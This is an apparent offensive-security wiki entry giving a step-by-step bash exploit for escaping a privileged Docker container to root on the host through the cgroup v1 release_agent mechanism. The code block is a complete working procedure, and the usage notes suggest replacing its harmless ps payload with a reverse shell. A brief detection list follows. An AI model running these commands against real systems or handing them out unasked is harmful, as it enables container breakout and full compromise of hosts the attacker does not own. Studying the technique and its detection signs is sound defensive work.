---
id: 949b89b9-0cbb-45d0-90a8-cf7d2b89093b
name: cgroup-privilege-escalation-steps
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:17.110107+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - cgroup
  - exploit
validated: true
---

# cgroup-privilege-escalation-steps

## Code

```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Description

Step-by-step bash commands to execute inside a privileged container: mount cgroup, configure release agent and notifications, create a host-executable script, and trigger process attachment to escalate to root on the host via kernel release handling.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $host_path | Extracted host cgroup path | /sys/fs/cgroup |

## Usage

Execute sequentially after starting the container. Customize the script echo for different payloads (e.g., reverse shell). Wait 5-10s after attach for trigger; check output file on host.

## Detection

- Container logs with cgroup mount commands.
- Anomalous writes to /sys/fs/cgroup/release_agent.
- Kernel executing unexpected scripts in cgroup context.
- Process attachment via cgroup.procs from untrusted PIDs.

## Related

- [[procedures/Abuse-Linux-Cgroup-v1-with-CAP-SYS-ADMIN-for-Host-Privilege-Escalation]]
